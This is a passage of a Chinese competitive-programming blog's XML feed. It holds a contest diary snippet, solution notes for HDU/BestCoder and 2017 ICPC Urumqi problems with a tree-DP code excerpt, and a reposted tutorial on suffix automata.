28</em></h4><p>早上吃饭，宾馆的实在是没啥想吃的东西，咖啡也不给喝。。。<br>坐主办方的车过去，结果报过到的队啥都不用干。。。<br>然后我们就开始瞎逛，不抱希望地联系了一下同学【因为她说周六早上没空<br>结果我们还没正式开始逛她就回复我啦，而且一下子就找到了我们~<br>她说是参加高数竞赛，然后水了水就出来了hhhhhhh</p><p>中午一不小心就点了个比较重口的菜，不过味道还可以。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>zimpha的bc出题录（部分）</title>
      <url>/blog/2017/10/18/zimpha-bestcoder/</url>
      <content type="html"><![CDATA[<h3 id="A-GCD-is-Funny"><a href="#A-GCD-is-Funny" class="headerlink" title="A - GCD is Funny"></a><a href="https://vjudge.net/problem/HDU-5902" target="_blank" rel="noopener">A - GCD is Funny</a></h3><p>题意：在黑板上写有$n$个数，每次删掉$a,b,c$三个数并把$d$写两遍，$d$可以是$(a,b),(a,c),(b,c)$。在$n-2$次操作后会留下两个相同的数，输出这个数的所有可能情况。<br>题解：给跪了。。。其实是所有大小超过$1$的子集的$gcd$的集合。。。</p><p>注意点：<strong>值域限制</strong>，说是子集当然不可能直接按子集做，而是利用值域很小这一点标记着做；<strong>gcd下降速度</strong>，两个不一样的数取$gcd$，最大也只能是大数的一半，即<strong>对数级别次</strong>就可以到$1$。</p><h3 id="B-Square-Distance"><a href="#B-Square-Distance" class="headerlink" title="B - Square Distance"></a><a href="https://vjudge.net/problem/HDU-5903" target="_blank" rel="noopener">B - Square Distance</a></h3><p>题意：给一个串$s$，长度为$n$(保证偶数)，输出一个串$t$，要满足：$t$由两个相同的串拼接而成；$s$到$t$的汉明距离恰好为$m$；$t$是所有满足条件的串中字典序最小的。$s,t$均只含小写字母，若$t$不存在输出<code>Impossible</code>。<br>题解：后半段放到前半段综合考虑，用dp可以求出前$i$个字符产生$j$个距离可不可行。因为要输出字典序最小，所以最终的贪心一定是从前往后从小往大，若是直接在这种dp上贪心，会导致最后的距离不一定是$m$。所以这里需要倒着dp，即从第$\frac{n}{2}$个到第$i$个字符产生$j$个距离可不可行。</p><p>注意点：看着很像贪心但是没有具体策略的时候一定要<strong>想一想dp</strong>！不一定只贪心或者只dp，也不一定是用贪心优化dp，像这题就是<strong>在dp得到的表上进行贪心</strong>。</p><h3 id="C-LCIS"><a href="#C-LCIS" class="headerlink" title="C - LCIS"></a><a href="https://vjudge.net/problem/HDU-5904" target="_blank" rel="noopener">C - LCIS</a></h3><p>题意：给出$n$个数的序列$a$和$m$个数的序列$b$，问公共的上升的并且数值连续的子序列的最长长度。<br>题解：对$a$扫一遍得到以$x$结尾的连续值上升子序列的最长长度，同样地对$b$扫一遍，最后枚举结尾是什么数字，取两个结果的较小值更新答案。</p><p>注意点：当对子序列的限制非常强时，很有可能可以<strong>每个序列分开做</strong>，最后再合并到答案。</p><h3 id="D-Black-White-Tree"><a href="#D-Black-White-Tree" class="headerlink" title="D - Black White Tree"></a><a href="https://vjudge.net/problem/HDU-5905" target="_blank" rel="noopener">D - Black White Tree</a></h3><p>题意：$n$个节点的无根树$T$，每个节点是黑色或者白色，求$W = \displaystyle\sum_{a=0}^{n}\sum_{b=0}^{n}{(a+1)(b+1)S(a,b)}$，其中$S(a,b)=1$表示存在一个子树恰好由$a$个白色节点和$b$个黑色节点构成，$S(a,b)=0$表示不存在。$T$的一个子树定义为$T$的一个子图并且是树。<br>题解：对于确定大小的子树，如果可以知道最少以及最多有几个黑色节点，那么答案直接两重循环加一个判断就可以算出来了。所以我们可以进行树形dp求出这个最少和最多。先规定$1$作为根，那么题意中的子树就是规定根以后的连通块，用$f[u][i],g[u][i]$分别表示以$u$为根，大小为$i$时最少和最多的黑色节点数，用$F[i],G[i]$表示连通块大小为$i$时最少和最多的黑色节点数。这个转移直接借助代码来说还更好一点。<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">void dfs(int u,int fa)</div><div class="line">&#123;</div><div class="line">    sz[u]=<span class="number">1</span>;</div><div class="line">    f[u][<span class="number">1</span>]=g[u][<span class="number">1</span>]=s[u]-<span class="string">'0'</span>;</div><div class="line">    for (int v:eg[u]) &#123;</div><div class="line">        if (v==fa) continue;</div><div class="line">        dfs(v,u);</div><div class="line">        for (int i=sz[u];i&gt;=<span class="number">1</span>;i--) &#123;</div><div class="line">            for (int j=<span class="number">1</span>;j&lt;=sz[v];j++) &#123;</div><div class="line">                f[u][i+j]=min(f[u][i+j],f[u][i]+f[v][j]);</div><div class="line">                g[u][i+j]=max(g[u][i+j],g[u][i]+g[v][j]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        sz[u]+=sz[v];</div><div class="line">    &#125;</div><div class="line">    for (int i=<span class="number">1</span>;i&lt;=sz[u];i++) &#123;</div><div class="line">        <span class="symbol">F</span>[i]=min(<span class="symbol">F</span>[i],f[u][i]);</div><div class="line">        <span class="symbol">G</span>[i]=max(<span class="symbol">G</span>[i],g[u][i]);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>每个节点被访问深度次，所以最终的复杂度是$O(n^2)$。</p><p>注意点：<strong>无根树的子树</strong>等价于确定一个根以后的<strong>连通块</strong>。</p><h3 id="F-Aaronson"><a href="#F-Aaronson" class="headerlink" title="F - Aaronson"></a><a href="https://vjudge.net/problem/HDU-5747" target="_blank" rel="noopener">F - Aaronson</a></h3><p>题意：$x_{0}+2x_{1}+4x_{2}+…+2^{m}x_{m}=n$的解是$(x_0,x_1,x_2,…,x_m)$，$x_i \ge 0$，求$\displaystyle\sum_{i=0}^{m} x_i$的最小值，$(0 \le n,m \le 10^9)$。<br>题解：若$m$比较小，特殊处理一下$x_m$，剩下的以及其他的情况都是二进制表示的$1$的个数。</p><h3 id="G-Bellovin"><a href="#G-Bellovin" class="headerlink" title="G - Bellovin"></a><a href="https://vjudge.net/problem/HDU-5748" target="_blank" rel="noopener">G - Bellovin</a></h3><p>题意：长度为$n$的$a$序列，求一个长度也为$n$的$b$序列满足，$a$中以$a_i$结尾的$LIS$长度和$b$中以$b_i$结尾的$LIS$长度相等$(1\le i \le n)$，$b$的字典序最小。<br>题解：因为$b_i$最小是$1$，直接把$a$中以$a_i$结尾的$LIS$长度当作$b_i$即可。</p><h3 id="H-Colmerauer"><a href="#H-Colmerauer" class="headerlink" title="H - Colmerauer"></a><a href="https://vjudge.net/problem/HDU-5749" target="_blank" rel="noopener">H - Colmerauer</a></h3><p>题意：一个矩阵的权值定义为其所含的所有鞍点的值的和，若一个点在列上是唯一最大值，在行上是唯一最小值，则其为鞍点。又在矩阵$M$上定义$S(a,b)$，表示所有大小为$a$行$b$列的子矩阵的权值和。现给出矩阵$M$，求$W = (\displaystyle\sum_{a=1}^{n}\sum_{b=1}^{m}{a \cdot b \cdot S(a,b)}) \text{ mod } 2^{32}$。<br>题解：很容易想到单点贡献。对于矩阵中的每一个点，我们暴力出（或者用单调栈优化一下）它能往上下左右延伸的长度，然后直接贡献即可。</p><p>注意点：左右长度的算式没有理清楚，应该<strong>写出原始的公式再进行化简</strong>。</p><h3 id="I-Dertouzos"><a href="#I-Dertouzos" class="headerlink" title="I - Dertouzos"></a><a href="https://vjudge.net/problem/HDU-5750" target="_blank" rel="noopener">I - Dertouzos</a></h3><p>题意：$n$的真因子是不为$n$的因子。给出$n$和$d$，问有多少小于$n$的数的最大真因子是$d$。<br>题解：即$pd=m\lt n$，显然有</p><ol><li>$p \le \frac{n-1}{d}$；</li><li>$p$必须为质数；【如若不然，则$p$有真因子$q$，$qd$是比$d$更大的$m$的真因子。 </li><li>$p \le c$，其中$c$为$d$的最小质因子。【如若不然，则$\frac{d}{c}\times p$是比$d$更大的$m$的真因子。</li></ol><p>由2，我们先做一遍筛法以及前缀和。再算出1的界，最后用筛出来的质数去算3的界。</p><p>注意点：用筛出来的质数去算3的界会有$O(\sqrt{d})$的复杂度，当$d$很大($\approx 10^{9}$)时会超时，而此时1的界必然比较小，应该<strong>在超过已有的界时及时退出</strong>。</p><h3 id="J-Eades"><a href="#J-Eades" class="headerlink" title="J - Eades"></a><a href="https://vjudge.net/problem/HDU-5751" target="_blank" rel="noopener">J - Eades</a></h3><p>题意：长度为$n$的$a$序列，定义$g(l,r)$为$a_l$到$a_r$的最大值，定义$f(l,r)=\displaystyle\sum_{i=l}^{r}[a_i = g(l,r)]$。求对于所有$1\le k \le n$的$k$分别有多少对$(l,r)$满足$f(l,r)=k$。<br>题解：如果$a_i$要对$f$函数有贡献的话必须是这个区间内最大的，所以首先用单调栈求出往左以及往右第一个大于$a_i$的位置。那么在$L+1…R-1$中，$a_i$这个值将区间分为若干段，朴素的想法是直接枚举左端点和右端点在哪一段上然后累加到答案，但是这样还是$O(n^2)$的<del>【其实处理得好能卡过</del>，不过进一步可以发现具体贡献到哪一个答案其实只跟$j-i$(两个段编号的差)有关，那么把其中一个反过来就是一个卷积形式，可以套一个$fft$。</p><p>注意点：具体细节较多，<strong>想不清楚时一定要耐心&amp;动手模拟一下</strong>。</p><h3 id="K-LCP-Array"><a href="#K-LCP-Array" class="headerlink" title="K - LCP Array"></a><a href="https://vjudge.net/problem/HDU-5635" target="_blank" rel="noopener">K - LCP Array</a></h3><p>题意：$s$是一个$1base$的字符串，记$a_i=lcp(ssuff_i,suff_{i+1})$，$(1 \le i &lt; n)$。现给出$a$序列，问有多少只含小写字母的字符串$s$满足这个序列。<br>题解：若$a_i$不为$0$，那么$s_i…s_{i+a_{i}}$这些字符必须全都相同(手动模拟一下)，由此推出从后往前：$a_i$不为$0$则必须连续地增加，若不满足答案为$0$；$a_i$为$0$则将答案乘上25。</p><h3 id="L-Shortest-Path"><a href="#L-Shortest-Path" class="headerlink" title="L - Shortest Path"></a><a href="https://vjudge.net/problem/HDU-5636" target="_blank" rel="noopener">L - Shortest Path</a></h3><p>题意：$n$个点的无向图，原来在$i$和$i+1$之间有边，现在添加3条边，所有边的权值都是$1$，每次询问$u$到$v$的最短路是多少。<br>题解：实际上就是改变了6个点(或者不到6个)之间的距离，直接Floyd。询问的时候直接暴力枚举穿过哪两个点。</p><p>注意点：不要忘记跟初始的距离取$min$。</p><h3 id="M-Transform"><a href="#M-Transform" class="headerlink" title="M - Transform"></a><a href="https://vjudge.net/problem/HDU-5637" target="_blank" rel="noopener">M - Transform</a></h3><p>题意：给出$n$个数，可以对整数$x$进行两种操作，</p><ol><li>翻转$x$的一个bit；</li><li>$x \leftarrow x\ xor\ a_i$ 。</li></ol><p>每次询问把$S$变成$T$最少需要几步。<br>题解：两个操作都可以归结为$xor$，所以从$S$走到$T$跟从$0$走到$S\ xor\ T$是等价的。直接以$0$为起点按两种操作进行$bfs$，$O(1)$回答。</p><p>注意点：<strong>状态数trick</strong>，虽然每次有几十条边，但是最后询问的范围只有$10^5$左右，最多也就是$0$到$(2^{17}-1)$每个点都走一遍。</p><h3 id="N-Toposort"><a href="#N-Toposort" class="headerlink" title="N - Toposort"></a><a href="https://vjudge.net/problem/HDU-5638" target="_blank" rel="noopener">N - Toposort</a></h3><p>题意：有向无环图有$n$个点$m$条边，问恰好删除$k$条边可以做到的字典序最小的拓扑序。<br>题解：考虑字典序最小，首先$1$号点放在第一绝对比放在第二好，那么：如果$1$号点当前的入度$d_1$小于等于$k$，直接将这$d_1$条边全部删除即可；如果大于，再测试$2$号点、$3$号点……。用优先队列保证每次取出的是最小编号的点，每条边访问一次，每个点最多入队$n$次，复杂度感觉上是$O((n+m)log{n})$。</p><p>注意点：<strong>对字典序和贪心的理解不够深刻</strong>。</p><h3 id="O-Deletion"><a href="#O-Deletion" class="headerlink" title="O - Deletion"></a><a href="https://vjudge.net/problem/HDU-5639" target="_blank" rel="noopener">O - Deletion</a></h3><p>题意：无向图$G$有$n$个点$m$条边，每次可以删除一个边集，要求这个边集组成的导出子图的每个连通分量最多只有一个环。问最少几次可以把图$G$完全删除。<br>题解：对于一个连通分量，若至多一个环，那它就是一个广义的环加外向树（可以没有环或者没有树）。环加树又可以理解为每个点最多一个出度，再反推回去，若有答案为$k$，那么等价于给图$G$中的每条边定向，使得所有点的出度均不超过$k$。考虑到一条边$(u,v)$，要么在$u$是出度要么在$v$是出度，新建一个点$x_{uv}$表示原图中的这条边，那么它要么与$u$匹配要么与$v$匹配。在这个新图中，左边的点(原图的点)最多匹配$k$次，右边的点(原图的边)最多匹配$1$次，且当右边的点完全匹配时$k$是一个可行的答案，可以二分答案每次判断最大流是不是等于$m$。xg最后提到其实二分可以不要，因为右边的点到汇的容量始终是$1$，每次改改增广路啥的。<del>【然而这种操作本菜鸡就没必要学了吧。。。</del></p><p>注意点：环、树、环加树的<strong>点数边数</strong>以及<strong>度数</strong>都有特殊的结论。</p><h3 id="P-Card-Game"><a href="#P-Card-Game" class="headerlink" title="P - Card Game"></a><a href="https://cn.vjudge.net/problem/HDU-5494" target="_blank" rel="noopener">P - Card Game</a></h3><p>题意：Soda 和 Beta 各有$n$张牌，两人随机抽$m$张牌，用它们的和比大小，问 Soda 能不能稳赢。<br>题解：取 Soda 最小的$m$张跟 Beta 最大的$m$张，它们的和比一下大小。</p><h3 id="Q-LCS"><a href="#Q-LCS" class="headerlink" title="Q - LCS"></a><a href="https://cn.vjudge.net/problem/HDU-5495" target="_blank" rel="noopener">Q - LCS</a></h3><p>题意：有两个排列${a_1, a_2, …, a_n}$，${b_1, b_2, …, b_n}$，要找到另一个排列${p_1, p_2, …, p_n}$，使得${a_{p_1},a_{p_2},…,a_{p_n}}$和${b_{p_1},b_{p_2},…,b_{p_n}}$的$LCS$最长，输出$LCS$长度的最大值。<br>题解：$b$是$a$的置换，长度为$l$的环能产生$l-1$的$LCS$。</p><p>注意点：特判环长度为1。</p><h3 id="R-Beauty-of-Sequence"><a href="#R-Beauty-of-Sequence" class="headerlink" title="R - Beauty of Sequence"></a><a href="https://vjudge.net/problem/HDU-5496" target="_blank" rel="noopener">R - Beauty of Sequence</a></h3><p>题意：定义魅力值为一个序列去除序列中连续重复元素(每一段只保留一个)后的序列的和。给出$n$个数的序列$a$，求$a$的所有子序列的魅力值之和。<br>题解：考虑单点贡献，并且出现连续相同值时只有最左边的要贡献。那么对于$a_i$，只要之前的子序列不以$a_i$结尾就可以贡献，累加答案以后更新一下以$a_i$结尾的子序列的数量即可。</p><p>注意点：不用考虑本质不同。</p><h3 id="U-Souvenir"><a href="#U-Souvenir" class="headerlink" title="U - Souvenir"></a><a href="https://vjudge.net/problem/HDU-5310" target="_blank" rel="noopener">U - Souvenir</a></h3><p>题意：$p$块钱可以买1个纪念品，$q$块钱可以买纪念品套装，内含$m$个纪念品，问要给$n$个人各发一个纪念品至少要多少钱。<br>题解：只有三种情况，只用$p$，只用$q$，用$q$直到剩下不到$m$的用$p$。</p><p>注意点：显然是可以多买的。</p><h3 id="W-Sequence"><a href="#W-Sequence" class="headerlink" title="W - Sequence"></a><a href="https://vjudge.net/problem/HDU-5312" target="_blank" rel="noopener">W - Sequence</a></h3><p>题意：一个数列的第$n(n \ge 1)$项为$3n(n-1)+1$，给出一个数$m$，问至少几个数的和能恰好等于$m$。如，$22 = 19 + 1 + 1 + 1 = 7 + 7 + 7 + 1$。若不能，输出$-1$。<br>题解：联想到三角形数$a_{n}=\frac{1}{2}n(n-1)$，至多3个三角形数可以表示任意自然数。而$3n(n-1)+1=6a_{n}+1$，那么$m\equiv ans \mod 6$。特判一下$ans$等于$1$或$2$，否则就是$3\dots 8$中与$m$同余的数。</p><p>注意点：<strong>特判也需要考虑复杂度</strong>！</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017ICPC乌鲁木齐网络赛 全题解</title>
      <url>/blog/2017/09/25/2017-urumqi-online/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/09/09/icpc_urumqi" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="A-Banana"><a href="#A-Banana" class="headerlink" title="A. Banana"></a>A. Banana</h3><p>直接暴力。</p><h3 id="B-Out-out-control-cars"><a href="#B-Out-out-control-cars" class="headerlink" title="B. Out-out-control cars"></a>B. Out-out-control cars</h3><p>可以看作相对运动，然后三条射线跟三条线段判相交。<br>要注意的是大三角形的射线不碰到小三角形也可以yes，这个我们可以通过两个都判一遍来解决。<br>还有一种情况（数据里好像没有）是两者相对静止并且一个套一个，按照题意也是yes。</p><h3 id="C-Coconut"><a href="#C-Coconut" class="headerlink" title="C. Coconut"></a>C. Coconut</h3><p>直接模拟。</p><h3 id="D-Hack-Portals"><a href="#D-Hack-Portals" class="headerlink" title="D. Hack Portals"></a>D. Hack Portals</h3><p>poj原题。<del>没做过，所以比赛的时候也没做</del><br>按照坐标排序后，有一个贪心的结论：i到j这一段区间中，最优情况下最后一个做的不是i就是j。<br>考虑区间dp，我们用dp[i][j][0]表示i到j这一段最后做i的最小花费，dp[i][j][1]表示i到j这一段最后做j的最小花费。<br>转移还是挺容易的，转移了以后还要再考虑一下开放的时间。</p><h3 id="E-Half-consecutive-Numbers"><a href="#E-Half-consecutive-Numbers" class="headerlink" title="E. Half-consecutive Numbers"></a>E. Half-consecutive Numbers</h3><p>打表。<del>反正我们队只会打表了</del><br><img src="http://img.blog.csdn.net/20170928164144650" alt="q巨题解"></p><h3 id="F-Islands"><a href="#F-Islands" class="headerlink" title="F. Islands"></a>F. Islands</h3><p>hdu原题。<br>缩点以后看出度为0的点数和入度为0的点数，答案为较大值。注意特判只有1个scc。</p><h3 id="G-Query-on-a-string"><a href="#G-Query-on-a-string" class="headerlink" title="G. Query on a string"></a>G. Query on a string</h3><p>因为模式串的长度很短，小于等于10，所以修改一个字符最多只会影响主串中10个位置的匹配情况。那么操作可以转化为10次单点修改和区间求和，用一个树状数组维护就可以了。有影响的那个部分可以用kmp匹配一下。</p><h3 id="H-Skiing"><a href="#H-Skiing" class="headerlink" title="H. Skiing"></a>H. Skiing</h3><p>队友一下子就读懂了，加个源跑最长路就行。</p><h3 id="I-Colored-Graph"><a href="#I-Colored-Graph" class="headerlink" title="I. Colored Graph"></a>I. Colored Graph</h3><p>比赛的时候直接抄的论文。<del>还抄错了好多次</del><br>回忆同色三角形的计数过程，其实是算了异色三角形的个数$S$，$S=\frac{1}{2}\sum_{i=1}^{V}{a_{i}(V-1-a_{i})}$ 。<br>现要使得同色三角形个数尽量小，那么就要使每个点的${a_{i}(V-1-a_{i})}$尽量大。<br>由于和一定，两项自然是越接近结果越大。考虑把点集分为两个，每个集合内部的边都是白色，两个集合之间的都是黑色。<br>若$V$是偶数，那么每个点的值都是一模一样的，不用调整。<br>下面重点讨论$V$是奇数的情况，记$n=\lfloor \frac{V}{2} \rfloor$，则两个点集$V1$，$V2$的大小分别为$n$，$n+1$。<br>在$V1$中，每个点有$n+1$条黑边和$n-1$条白边，这一定是可以更优的。<br>首先把黑边分散地改成白边，即把在$i$和$n+i$之间的黑边改成白边，此时$V1$的点会很平衡，不过$V2$中有$n$个点变成了$n-1$条黑边和$n+1$条白边。<br>所以还能更优，当然这时不能再改$n$条边了，要不然就会没完了。将$V2$修改过的$n$个点分成$\frac{n}{2}$组点对，各点对中的白边改成黑边，那么这$n$个点有$n$条黑边和$n$条白边，非常恰好。如果$n$也是奇数，那么就不能这么恰好了，但是大体是一样的，见代码。</p><h3 id="J-Our-Journey-of-Dalian-Ends"><a href="#J-Our-Journey-of-Dalian-Ends" class="headerlink" title="J. Our Journey of Dalian Ends"></a>J. Our Journey of Dalian Ends</h3><p>hdu原题。<br>中转站为源做一遍最小费用流。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>后缀自动机·基本概念</title>
      <url>/blog/2017/08/27/SAM/</url>
      <content type="html"><![CDATA[<p><span style="color: red">以下全文转载自<a href="http://hihocoder.com/problemset/problem/1441" target="_blank" rel="noopener">hihocoder</a></span>，今天看了一遍突然就懂了，难道我以前看的都是假文章？<br>小Hi：今天我们来学习一个强大的字符串处理工具：后缀自动机（Suffix Automaton，简称SAM）。<strong>对于一个字符串S，它对应的后缀自动机是一个最小的确定有限状态自动机（DFA），接受且只接受S的后缀。</strong></p><p>小Hi：比如对于字符串S=”aabbabd”，它的后缀自动机是：<br><img src="http://media.hihocoder.com/problem_images/20161203/14807564643248.png" alt=""><br>其中红色状态是终结状态。你可以发现对于S的后缀，我们都可以从S出发沿着字符标示的路径（蓝色实线）转移，最终到达终结状态。例如”bd”对应的路径是S59，”abd”对应的路径是S189，”abbabd”对应的路径是S184679。而对于不是S后缀的字符串，你会发现从S出发，最后会到达非终结状态或者“无路可走”。<strong>特别的，对于S的子串，最终会到达一个合法状态。</strong>例如”abba”路径是S1846，”bbab”路径是S5467。<strong>而对于其他不是S子串的字符串，最终会“无路可走”。</strong>例如”aba”对应S18X，”aaba”对应S123X。（X表示没有转移匹配该字符）</p><p>小Ho：好像很厉害的样子！对于任意字符串都能构造出一个SAM吗？另外图中那些绿色虚线是什么？</p><p>小Hi：是的，任意字符串都能构造出一个SAM。我们知道SAM本质上是一个DFA，DFA可以用一个五元组<strong>&lt;字符集，状态集，转移函数、起始状态、终结状态集&gt;</strong>来表示。下面我们将依次介绍对于一个给定的字符串S如何确定它对应的<strong>状态集</strong>和<strong>转移函数</strong>。至于那些绿色虚线虽然不是DFA的一部分，却是SAM的重要部分，有了这些链接SAM是如虎添翼，我们后面再细讲。</p><h2 id="SAM的States"><a href="#SAM的States" class="headerlink" title="SAM的States"></a>SAM的States</h2><p>小Hi：这一节我们将介绍给定一个字符串S，如何确定S对应的SAM有哪些状态。首先我们先介绍一个概念<strong>子串的结束位置集合</strong>endpos。对于S的一个子串s，endpos(s) = s在S中所有出现的结束位置集合。还是以S=”aabbabd”为例，endpos(“ab”) = {3, 6}，因为”ab”一共出现了2次，结束位置分别是3和6。同理endpos(“a”) = {1, 2, 5}, endpos(“abba”) = {5}。</p><p>小Hi：我们把S的所有子串的endpos都求出来。如果两个子串的endpos相等，就把这两个子串归为一类。最终这些endpos的等价类就构成的SAM的状态集合。例如对于S=”aabbabd”：</p><table><thead><tr><th>状态</th><th>子串</th><th>endpos</th></tr></thead><tbody><tr><td>S</td><td>空串</td><td>{0,1,2,3,4,5,6}</td></tr><tr><td>1</td><td>a</td><td>{1,2,5}</td></tr><tr><td>2</td><td>aa</td><td>{2}</td></tr><tr><td>3</td><td>aab</td><td>{3}</td></tr><tr><td>4</td><td>aabb,abb,bb</td><td>{4}</td></tr><tr><td>5</td><td>b</td><td>{3,4,6}</td></tr><tr><td>6</td><td>aabba,abba,bba,ba</td><td>{5}</td></tr><tr><td>7</td><td>aabbab,abbab,bbab,bab</td><td>{6}</td></tr><tr><td>8</td><td>ab</td><td>{3,6}</td></tr><tr><td>9</td><td>aabbabd,abbabd,bbabd,babd,abd,bd,d</td><td>{7}</td></tr></tbody></table><p>小Ho：这些状态恰好就是上面SAM图中的状态。</p><p>小Hi：没错。此外，这些状态还有一些美妙的性质，且等我一一道来。首先对于S的两个子串s1和s2，不妨设length(s1) &lt;= length(s2)，那么<strong>s1是s2的后缀当且仅当endpos(s1) ⊇ endpos(s2)，s1不是s2的后缀当且仅当endpos(s1) ∩ endpos(s2) = ∅。</strong></p><p>小Ho：我验证一下啊… 比如”ab”是”aabbab”的后缀，而endpos(“ab”)={3,6}，endpos(“aabbab”)={6}，是成立的。”b”是”ab”的后缀，endpos(“b”)={3,4,6}, endpos(“ab”)={3,6}也是成立的。”ab”不是”abb”的后缀，endpos(“ab”)={3,6}，endpos(“abb”)={4}，两者没有交集也是成立的。怎么证明呢？</p><p>小Hi：证明还是比较直观的。首先证明<strong>s1是s2的后缀=&gt;endpos(s1) ⊇ endpos(s2)</strong>：既然s1是s2后缀，所以每次s2出现时s1以必然伴随出现，所以有endpos(s1) ⊇ endpos(s2)。再证明<strong>endpos(s1) ⊇ endpos(s2)=&gt;s1是s2的后缀</strong>：我们知道对于S的子串s2，endpos(s2)不会是空集，所以endpos(s1) ⊇ endpos(s2)=&gt;存在结束位置x使得s1结束于x，并且s2也结束于x，又length(s1) &lt;= length(s2)，所以s1是s2的后缀。综上我们可知<strong>s1是s2的后缀当且仅当endpos(s1) ⊇ endpos(s2)。s1不是s2的后缀当且仅当endpos(s1) ∩ endpos(s2) = ∅</strong>是一个简单的推论，不再赘述。</p><p>小Ho：我好像对SAM的状态有一些认识了！我刚才看上面的表格就觉得SAM的一个状态里包含的子串好像有规律。考虑到SAM中的一个状态包含的子串都具有相同的endpos，那它们应该都互为后缀？</p><p>小Hi：你观察力还挺敏锐的。下面我们就来讲讲一个状态包含的子串究竟有什么关系。上文提到我们把S的所有子串按endpos分类，每一类就代表一个状态，所以我们可以认为一个状态包含了若干个子串。我们用substrings(st)表示状态st中包含的所有子串的集合，longest(st)表示st包含的最长的子串，shortest(st)表示st包含的最短的子串。例如对于状态7，substring(7)={aabbab,abbab,bbab,bab}，longest(7)=aabbab，shortest(7)=bab。</p><p>小Hi：<strong>对于一个状态st，以及任意s∈substrings(st)，都有s是longest(st)的后缀。</strong>证明比较容易，因为endpos(s)=endpos(longest(st))，所以endpos(s) ⊇ endpos(longest(st))，根据我们刚才证明的结论有s是longest(st)的后缀。</p><p>小Hi：此外，<strong>对于一个状态st，以及任意的longest(st)的后缀s，如果s的长度满足：length(shortest(st)) &lt;= length(s) &lt;= length(longsest(st))，那么s∈substrings(st)。</strong>证明也是比较容易，因为：length(shortest(st)) &lt;= length(s) &lt;= length(longsest(st))，所以endpos(shortest(st)) ⊇ endpos(s) ⊇ endpos(longest(st))， 又endpos(shortest(st)) = endpos(longest(st))，所以endpos(shortest(st)) = endpos(s) = endpos(longest(st))，所以s∈substrings(st)。</p><p>小Ho：这么说来，substrings(st)包含的是longest(st)的一系列<strong>连续</strong>后缀？</p><p>小Hi：没错。比如你看状态7中包含的就是aabbab的长度分别是6，5，4，3的后缀；状态6包含的是aabba的长度分别是5，4，3，2的后缀。</p><h2 id="SAM的Suffix-Links"><a href="#SAM的Suffix-Links" class="headerlink" title="SAM的Suffix Links"></a>SAM的Suffix Links</h2><p>小Hi：前面我们讲到substrings(st)包含的是longest(st)的一系列<strong>连续</strong>后缀。这连续的后缀在某个地方会“断掉”。比如状态7，包含的子串依次是aabbab,abbab,bbab,bab。按照连续的规律下一个子串应该是”ab”，但是”ab”没在状态7里，你能想到这是为什么么？</p><p>小Ho：aabbab,abbab,bbab,bab的endpos都是{6}，下一个”ab”当然也在结束位置6出现过，但是”ab”还在结束位置3出现过，所以”ab”比aabbab,abbab,bbab,bab出现次数更多，于是就被分配到一个新的状态中了。</p><p>小Hi：没错，当longest(st)的某个后缀s在新的位置出现时，就会“断掉”，s会属于新的状态。比如上例中”ab”就属于状态8，endpos(“ab”}={3,6}。当我们进一步考虑”ab”的下一个后缀”b”时，也会遇到相同的情况：”b”还在新的位置4出现过，所以endpos(“b”)={3,4,6}，b属于状态5。在接下去处理”b”的后缀我们会遇到空串，endpos(“”)={0,1,2,3,4,5,6}，状态是起始状态S。</p><p>小Hi：于是我们可以发现一条状态序列：7-&gt;8-&gt;5-&gt;S。这个序列的意义是longest(7)即aabbab的后缀依次在状态7、8、5、S中。我们用Suffix Link这一串状态链接起来，这条link就是上图中的绿色虚线。</p><p>小Ho：原来如此。</p><p>小Hi：Suffix Links后面会有妙用，我们暂且按下不表。</p><h2 id="SAM的Transition-Function"><a href="#SAM的Transition-Function" class="headerlink" title="SAM的Transition Function"></a>SAM的Transition Function</h2><p>小Hi：最后我们来介绍SAM的转移函数。对于一个状态st，我们首先找到从它开始下一个遇到的字符可能是哪些。我们将st遇到的下一个字符集合记作next(st)，有next(st) = {S[i+1] | i ∈ endpos(st)}。例如next(S)={S[1], S[2], S[3], S[4], S[5], S[6], S[7]}={a, b, d}，next(8)={S[4], S[7]}={b, d}。</p><p>小Hi：对于一个状态st来说和一个next(st)中的字符c，你会发现substrings(st)中的所有子串后面接上一个字符c之后，新的子串仍然都属于同一个状态。比如对于状态4，next(4)={a}，aabb,abb,bb后面接上字符a得到aabba，abba，bba，这些子串都属于状态6。</p><p>小Hi：所以我们对于一个状态st和一个字符c∈next(st)，可以定义转移函数trans(st, c) = x | longest(st) + c ∈ substrings(x) 。换句话说，我们在longest(st)（随便哪个子串都会得到相同的结果）后面接上一个字符c得到一个新的子串s，找到包含s的状态x，那么trans(st, c)就等于x。</p><p>小Ho：吼~ 终于把SAM中各个部分搞明白了。</p><p>小Hi：SAM的构造有时空复杂度均为O(length(S))的算法，我们将在后面介绍。这一期你可以先用暴力算法依照定义构造SAM，先对SAM有个直观认识再说。</p><p>小Ho：没问题，暴力算法我最拿手了。我先写程序去了。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017年多校联训9 部分题解</title>
      <url>/blog/2017/08/23/2017-multi9/</url>
